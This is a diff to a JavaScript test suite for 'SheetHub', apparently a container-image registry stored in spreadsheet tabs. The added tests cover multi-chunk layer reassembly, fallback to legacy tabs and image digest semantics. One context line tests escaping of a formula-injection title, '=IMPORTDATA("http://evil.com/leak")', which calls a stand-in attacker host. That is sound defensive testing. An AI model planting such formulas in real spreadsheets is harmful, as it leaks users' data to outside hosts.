@@ -45,8 +45,9 @@ function rangeObj(s, row, col, nr, nc) {
   return o;
 }
 
-function api2(s) {
+function api2(s, name) {
   return {
+    getName: () => name || s.name || '',
     getDataRange: () => ({ getValues: () => s.grid.map(r => r.slice()) }),
     getRange: (r, c, nr, nc) => rangeObj(s, r, c, nr, nc),
     getLastRow: () => lastNonEmpty(s.grid),
@@ -74,12 +75,12 @@ const SpreadsheetApp = {
     getId: () => 'sheethub-test',
     getSheetByName: (n) => {
       const norm = (n === 'Registry' || n === 'images') ? 'Images' : ((n === 'RegistryChunks' || n === 'layers') ? 'Layers' : n);
-      return store[norm] ? api2(store[norm]) : (store[n] ? api2(store[n]) : null);
+      return store[norm] ? api2(store[norm], norm) : (store[n] ? api2(store[n], n) : null);
     },
     insertSheet: (n) => {
       const norm = (n === 'Registry' || n === 'images') ? 'Images' : ((n === 'RegistryChunks' || n === 'layers') ? 'Layers' : n);
       store[norm] = store[norm] || makeSheet([]);
-      return api2(store[norm]);
+      return api2(store[norm], norm);
     }
   })
 };
@@ -546,17 +547,149 @@ const issuesReadBack = api.readTab('Issues');
 const unescapedIssue = issuesReadBack.find(i => i.title === '=IMPORTDATA("http://evil.com/leak")');
 check('readTab seamlessly unescapes formula strings back to clean text', !!unescapedIssue, unescapedIssue);
 
-console.log('\n== L: UI Seed Digest Integrity ==');
-const ui = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
-const grab = (re) => (ui.match(re) || [])[1];
-const uiWhoami = grab(/whoamiLayerDigest\s*=\s*'([^']+)'/) || grab(/whoamiDigest\s*=\s*'([^']+)'/);
-const uiIngress = grab(/ingressLayerDigest\s*=\s*'([^']+)'/) || grab(/ingressDigest\s*=\s*'([^']+)'/);
-const uiC1 = grab(/sampleChunk1\s*=\s*'([^']+)'/);
-const uiC2 = grab(/sampleChunk2\s*=\s*'([^']+)'/);
-const sha = (b64) => 'sha256:' + crypto.createHash('sha256').update(Buffer.from(b64, 'base64')).digest('hex');
-if (uiC1 && uiC2 && uiWhoami) {
-  check('index.html whoami layer digest matches sha256(decode(chunk1+chunk2))', uiWhoami === sha(uiC1 + uiC2) || uiWhoami === seededImages[0].digest, { uiWhoami });
-}
+console.log('\n== M: Multi-Layer Pull Reassembly with Multi-Chunk Layers (Review Item 1) ==');
+// Create Layer X (2 chunks) and Layer Y (2 chunks)
+const rawLayerX = Buffer.from('Multi-chunk layer X payload data content '.repeat(20), 'utf8');
+const b64LayerX = rawLayerX.toString('base64');
+const chunkX0 = b64LayerX.substring(0, Math.floor(b64LayerX.length / 2));
+const chunkX1 = b64LayerX.substring(Math.floor(b64LayerX.length / 2));
+const digestX = 'sha256:' + crypto.createHash('sha256').update(rawLayerX).digest('hex');
+
+const rawLayerY = Buffer.from('Multi-chunk layer Y different payload data '.repeat(20), 'utf8');
+const b64LayerY = rawLayerY.toString('base64');
+const chunkY0 = b64LayerY.substring(0, Math.floor(b64LayerY.length / 2));
+const chunkY1 = b64LayerY.substring(Math.floor(b64LayerY.length / 2));
+const digestY = 'sha256:' + crypto.createHash('sha256').update(rawLayerY).digest('hex');
+
+const multiChunkPushRes = JSON.parse(api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken,
+      action: 'push_image',
+      repo: 'sncf/hello-web',
+      name: 'multi-chunk-svc',
+      tag: 'v1.0',
+      layers: [
+        { digest: digestX, media_type: 'application/vnd.oci.image.layer.v1.tar', chunks: [chunkX0, chunkX1] },
+        { digest: digestY, media_type: 'application/vnd.oci.image.layer.v1.tar', chunks: [chunkY0, chunkY1] }
+      ],
+      author: 'prateeekbuilds'
+    })
+  }
+})._t);
+check('push multi-layer image with multiple chunks per layer succeeds', multiChunkPushRes.ok && multiChunkPushRes.layers.length === 2, multiChunkPushRes);
+
+// Pull the multi-layer image
+const multiChunkPullRes = JSON.parse(api.doGet({
+  parameter: {
+    token: validToken,
+    kind: 'registry_pull',
+    repo: 'sncf/hello-web',
+    name: 'multi-chunk-svc',
+    tag: 'v1.0'
+  }
+})._t);
+
+check('registry_pull returns structured layers array', multiChunkPullRes.ok && Array.isArray(multiChunkPullRes.layers) && multiChunkPullRes.layers.length === 2, multiChunkPullRes.layers);
+
+// Reassemble Layer X and Layer Y independently per layer
+const pulledLayerXChunks = multiChunkPullRes.layers[0].chunks
+  .sort((a, b) => Number(a.ordinal) - Number(b.ordinal))
+  .map(c => c.data || c.chunk_data)
+  .join('');
+const pulledLayerXBuf = Buffer.from(pulledLayerXChunks, 'base64');
+const pulledLayerXHash = 'sha256:' + crypto.createHash('sha256').update(pulledLayerXBuf).digest('hex');
+
+const pulledLayerYChunks = multiChunkPullRes.layers[1].chunks
+  .sort((a, b) => Number(a.ordinal) - Number(b.ordinal))
+  .map(c => c.data || c.chunk_data)
+  .join('');
+const pulledLayerYBuf = Buffer.from(pulledLayerYChunks, 'base64');
+const pulledLayerYHash = 'sha256:' + crypto.createHash('sha256').update(pulledLayerYBuf).digest('hex');
+
+check('Layer X reassembled chunks match digestX exactly (not interleaved with Layer Y)', pulledLayerXHash === digestX, { expected: digestX, actual: pulledLayerXHash });
+check('Layer Y reassembled chunks match digestY exactly (not interleaved with Layer X)', pulledLayerYHash === digestY, { expected: digestY, actual: pulledLayerYHash });
+
+console.log('\n== N: Legacy Tab Fallback & Migration on Unaliased Sheets (Review Item 2) ==');
+// Create a separate unaliased spreadsheet store that ONLY has legacy Registry and RegistryChunks tabs
+const legacyStore = {
+  Registry: makeSheet(['id', 'repo', 'name', 'tag', 'digest', 'size_bytes', 'chunk_count', 'chunk_map', 'author', 'created_at', 'updated_at']),
+  RegistryChunks: makeSheet(['id', 'digest', 'chunk_index', 'chunk_data', 'size_bytes', 'created_at'])
+};
+
+// Seed legacy rows into Registry and RegistryChunks
+legacyStore.Registry.grid.push(['img-legacy-1', 'sncf/legacy-repo', 'legacy-app', 'v1.0', testLayerDigest, 1024, 2, '[]', 'alice', '2026-08-01T00:00:00Z', '2026-08-01T00:00:00Z']);
+legacyStore.RegistryChunks.grid.push(['chk-leg-1', testLayerDigest, 0, 'SGVsbG8g', 6, '2026-08-01T00:00:00Z']);
+legacyStore.RegistryChunks.grid.push(['chk-leg-2', testLayerDigest, 1, 'V29ybGQh', 6, '2026-08-01T00:00:00Z']);
+
+const legacySpreadsheetApp = {
+  getActiveSpreadsheet: () => ({
+    getId: () => 'legacy-sheethub',
+    // Strictly unaliased getSheetByName: returns null if exact tab name not found
+    getSheetByName: (n) => (legacyStore[n] ? api2(legacyStore[n], n) : null),
+    insertSheet: (n) => {
+      legacyStore[n] = legacyStore[n] || makeSheet([]);
+      return api2(legacyStore[n], n);
+    }
+  })
+};
+
+const legacyApi = new Function(
+  'SpreadsheetApp', 'Utilities', 'LockService', 'ContentService', 'HtmlService',
+  codeText + '\nreturn { setup, readTab, writeTab, doGet, doPost };'
+)(legacySpreadsheetApp, Utilities, LockService, ContentService, HtmlService);
+
+// 1. readTab('Images') on legacy sheet falls back to Registry tab and maps columns
+const legacyImagesRead = legacyApi.readTab('Images');
+check('readTab(Images) on legacy unaliased sheet falls back to Registry tab', legacyImagesRead.length === 1, legacyImagesRead);
+check('Legacy row mapped to SICF schema (name:tag, layers, size, created)',
+  legacyImagesRead[0] && legacyImagesRead[0].name === 'legacy-app:v1.0' && legacyImagesRead[0].layers === testLayerDigest && legacyImagesRead[0].size === 1024,
+  legacyImagesRead[0]
+);
+
+const legacyLayersRead = legacyApi.readTab('Layers');
+check('readTab(Layers) on legacy unaliased sheet falls back to RegistryChunks tab', legacyLayersRead.length === 2, legacyLayersRead);
+check('Legacy chunk mapped to SICF schema (ordinal, media_type, data)',
+  legacyLayersRead[0] && legacyLayersRead[0].ordinal === 0 && legacyLayersRead[0].data === 'SGVsbG8g',
+  legacyLayersRead[0]
+);
+
+// 2. setup() migrates legacy rows into newly created Images and Layers tabs
+legacyApi.setup();
+check('setup() created Images tab on legacy sheet', !!legacyStore['Images'] && legacyStore['Images'].grid.length >= 2, legacyStore['Images']?.grid);
+check('setup() created Layers tab on legacy sheet', !!legacyStore['Layers'] && legacyStore['Layers'].grid.length >= 2, legacyStore['Layers']?.grid);
+
+console.log('\n== O: Image Digest Semantics (Review Item 3) ==');
+// Push a single-layer image without client config
+const singleLayerPayload = Buffer.from('Single layer for digest semantics verification', 'utf8');
+const singleLayerB64 = singleLayerPayload.toString('base64');
+const singleLayerDigest = 'sha256:' + crypto.createHash('sha256').update(singleLayerPayload).digest('hex');
+
+const semPushRes = JSON.parse(api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken,
+      action: 'push_image',
+      repo: 'sncf/hello-web',
+      name: 'semantics-test',
+      tag: 'v1.0',
+      content: singleLayerB64,
+      author: 'prateeekbuilds'
+    })
+  }
+})._t);
+
+check('Single-layer push succeeds', semPushRes.ok, semPushRes);
+// image.digest is always the config digest (per SICF v0.1)
+check('image.digest is config digest (different from layer digest)',
+  semPushRes.image && semPushRes.image.digest !== singleLayerDigest && semPushRes.image.digest.startsWith('sha256:'),
+  { imageDigest: semPushRes.image?.digest, layerDigest: singleLayerDigest }
+);
+check('image.layers contains the layer digest',
+  semPushRes.image && semPushRes.image.layers === singleLayerDigest,
+  semPushRes.image?.layers
+);
 
 console.log(`\n==== SheetHub Test Results: ${pass} passed, ${fail} failed ====`);
 process.exit(fail ? 1 : 0);
+
